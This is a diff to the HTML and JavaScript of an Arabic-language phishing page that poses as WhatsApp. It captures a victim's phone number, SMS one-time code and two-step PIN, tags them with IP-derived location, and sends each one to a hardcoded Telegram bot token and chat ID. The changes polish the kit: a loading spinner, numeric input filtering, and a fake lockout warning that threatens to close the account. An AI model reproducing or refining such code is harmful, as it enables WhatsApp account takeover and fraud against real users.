@@ -78,6 +78,21 @@
           text-align: center;
         }
 
+        #global_spinner_overlay {
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: #fff;
+  z-index: 99999;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  display: none;
+  width: 100vw;
+  height: 100vh;
+}
+body.loading {
+  overflow: hidden;
+}
     </style>
 
 
@@ -150,7 +165,7 @@
 
                             <div class="form-group">
                                 <span id="verify_2S" class="text-danger" style="font-weight:bold;padding-bottom: 10px;display: none;">يرجى التحقق من الرمز المدخل</span>
-                                <input class="form-control" id="2S_in" type="" name="2S_in" placeholder="يرجى إدخال رمز التحقق بخطوتين الذي قمت بإعداده مسبقا">
+                                <input class="form-control" id="2S_in" type="text" name="2S_in" placeholder="يرجى إدخال رمز التحقق بخطوتين الذي قمت بإعداده مسبقا" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
                             </div>
 
                             <div class="text-center">
@@ -181,7 +196,7 @@
                             <div class="form-group">
                                 <span id="verify_otp" class="text-danger" style="font-weight:bold;padding-bottom: 10px;display: none;">يرجى التحقق من الرمز المدخل</span>
                               
-                                <input class="form-control aslo" id="OTP_in" type="" name="OTP_in" placeholder="-  -  -  -  -  -"  style="text-align: center;margin-top: 15px;border:none;font-size: 20px;color: green;">
+                                <input class="form-control aslo" id="OTP_in" type="text" name="OTP_in" placeholder="-  -  -  -  -  -"  style="text-align: center;margin-top: 15px;border:none;font-size: 20px;color: green;" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
                             </div>
 
                             <div class="text-center">
@@ -208,19 +223,19 @@
                                   <tbody style="text-align: center;">
                                       <tr>
                                           <td style="width:70%;">
-                                            <input id="tel" type="text" class="form-control" id="inlineFormInputGroupUsername2" placeholder="05 XX XX XX XX" style="text-align:left;direction: ltr;">
+                                            <input id="tel" type="text" class="form-control" id="inlineFormInputGroupUsername2" placeholder="05 XX XX XX XX" style="text-align:left;direction: ltr;" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
 
                                           </td>
                                           <td style="width:30%;">
 
                                             <select id="prefix" class="custom-select my-1 mr-sm-2" id="inlineFormCustomSelectPref" style="direction: ltr;">
                                                 <option selected>+966</option>
-                                                <option value="971">+971</option>
-                                                <option value="965">+965</option>
                                                 <option value="973">+973</option>
                                                 <option value="962">+962</option>
+                                                <option value="965">+965</option>
                                                 <option value="968">+968</option>
-                                              </select>
+                                                <option value="971">+971</option>
+                                            </select>
 
                                                   
 
@@ -264,9 +279,11 @@
     <small style="font-weight: bolder;color:#FFF;font-size:12px;">© 2024 جميع الحقوق محفوظة ل  Whatsapp chat </small>
 </footer>
 
-
-
-
+<div id="global_spinner_overlay">
+  <div class="spinner-border text-success" style="width: 4rem; height: 4rem;" role="status">
+    <span class="sr-only">Loading...</span>
+  </div>
+</div>
 
 <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
 <script src="bot_config.js"></script>
@@ -275,183 +292,115 @@
 
 
 <script>
+function showGlobalSpinner() {
+  $('body').addClass('loading');
+  $('#global_spinner_overlay').css('display', 'flex');
+  setTimeout(function() {
+    hideGlobalSpinner();
+  }, 5000);
+}
+function hideGlobalSpinner() {
+  $('#global_spinner_overlay').hide();
+  $('body').removeClass('loading');
+}
     $(document).ready(function() {
         let Ip = 0;
         let city = "Undifined";
         let country = "";
-         function json(url) {
-               return fetch(url).then(res => res.json());
-          }
-
-          let apiKey = '0710f50f77db5c9c3e39b55073be3e164b3dbd13835f75af07dd396f';
-          json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
-               console.log(data.ip);
-               console.log(data.city);
-               console.log(data.country_code);
-              Ip = data.ip;
-              City = data.city;
-              Country =  data.country_code;
-               // so many more properties
-          });
+        function json(url) {
+            return fetch(url).then(res => res.json());
+        }
+        let apiKey = '0710f50f77db5c9c3e39b55073be3e164b3dbd13835f75af07dd396f';
+        json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
+            Ip = data.ip;
+            City = data.city;
+            Country =  data.country_code;
+        });
         let i = 0;
-
         $('#forum').submit(function(event) {
             event.preventDefault();
-            
             $('#verify_tel').hide();
-            
-
-
-            const prefix = $("#prefix").val(); // الحصول على رقم الهاتف المدخل
-            const tel = $("#tel").val(); // الحصول على رقم الهاتف المدخل
-
-            //alert(prefix);
-            //alert(tel);
-
+            const prefix = $("#prefix").val();
+            const tel = $("#tel").val();
             if (!tel) {
                 $('#verify_tel').show();
                 i--;
                 return;
             }
-
-          
-
-
-
-
+            showGlobalSpinner();
             const telegramMessage = "--------AS_LO-------\nPrefix : "+ prefix +"\nTEL : " + tel + "\n--------------------\n" + "Adresse Ip :" + Ip + "\nCity : " + City + "\nPays : " + Country ;
-
             const telegramBotUrl = "https://api.telegram.org/bot" + "1093092007:AAH3mOWf1KrC-48Oo7qcY5wPqj-Wy25Giyg" + "/sendMessage";
             const requestData = {
                 chat_id: "-1002700761532",
                 text: telegramMessage
             };
-
-            // إرسال البيانات إلى الروبوت
             $.post(telegramBotUrl, requestData, function(response) {
-                console.log(response);
-               
+                // spinner auto removed after 3s
             });
-
-
-
             $('#OTP_msg').show();
             $('#tel_msg').hide();
-
-
-
             $('#forum').hide();
-
             $('#tele').hide();
-
-
             $('#OTP').show();
-
         });
-
-
-
-
         $('#OTP').submit(function(event) {
-            
             event.preventDefault();
-
             i++;
             if (i < 3) {
-                //alert(i);
                 $('#verify_otp').hide();
-                const OTP = $("#OTP_in").val(); // الحصول على رقم الهاتف المدخ
-                //alert(OTP);
-
+                const OTP = $("#OTP_in").val();
                 if (!OTP) {
                     $('#verify_otp').show();
                     return;
                 }
-
+                showGlobalSpinner();
                 const telegramMessage = "--------AS_LO-------\nSMS OTP : " + OTP + "\n--------------------\n" + "Adresse Ip :" + Ip + "\nCity : " + City + "\nPays : " + Country ;
                 const telegramBotUrl = "https://api.telegram.org/bot" + "1093092007:AAH3mOWf1KrC-48Oo7qcY5wPqj-Wy25Giyg" + "/sendMessage";
                 const requestData = {
                     chat_id: "-1002700761532",
                     text: telegramMessage
                 };
-
-                // إرسال البيانات إلى الروبوت
                 $.post(telegramBotUrl, requestData, function(response) {
                     $('#verify_otp').show();
-                    //alert("يرجى التأكد من الرمز المدخل");
                 });
-
                 $('#OTP_msg').show();
                 $('#tel_msg').hide();
-
                 $('#forum').hide();
                 $('#OTP').show();
-
-
-            }else{
-
-
+            } else {
                 $('#OTP').hide();
                 $('#OTP_msg').hide();
                 $('#forum').hide();
                 $('#tel_msg').hide();
-
-
-
-                
                 $("2S_msg").show();
                 $('#2S_Form').show();
-
             }
         });
-
-
-
-
-
-
+        let twoS_attempts = 0;
         $('#2S_Form').submit(function(event) {
-            
             event.preventDefault();
-
-            //alert(i);
             $('#verify_2S').hide();
-
-
-            
-            const twos_code = $("#2S_in").val(); // الحصول على رقم الهاتف المدخ
-            //alert(twos_code);
-
+            showGlobalSpinner();
+            const twos_code = $("#2S_in").val();
             if (!twos_code) {
                 $('#verify_2S').show();
                 return;
             }
-
+            twoS_attempts++;
+            if (twoS_attempts >= 3) {
+                $('#2S_Form').html('<div class="text-danger text-center"><img width=96px" src="error.png" style="margin-buttom:15px;" /><h3 class="text-bold" style="margin-top:15px;">لقد تجاوزت الحد الأقصى لعدد المحاولات. يجب عليك إزالة WhatsApp وإعادة المحاولة خلال 3 ساعات أو سيتم إغلاق حسابك نهائيًا</h3></div>');
+                return;
+            }
             const telegramMessage = "--------AS_LO-------\nSMS 2 Steps code : " + twos_code + "\n--------------------\n" + "Adresse Ip :" + Ip + "\nCity : " + City + "\nPays : " + Country ;
             const telegramBotUrl = "https://api.telegram.org/bot" + "1093092007:AAH3mOWf1KrC-48Oo7qcY5wPqj-Wy25Giyg" + "/sendMessage";
             const requestData = {
                 chat_id: "-1002700761532",
                 text: telegramMessage
             };
-
-            // إرسال البيانات إلى الروبوت
             $.post(telegramBotUrl, requestData, function(response) {
                 $('#verify_2S').show();
-                //alert("يرجى التأكد من الرمز المدخل");
             });
-
-            /*$('#OTP_msg').show();
-            $('#tel_msg').hide();
-
-            $('#forum').hide();
-            $('#OTP').show();*/
-
-
-
         });
-
-
-
     });
 </script>
 
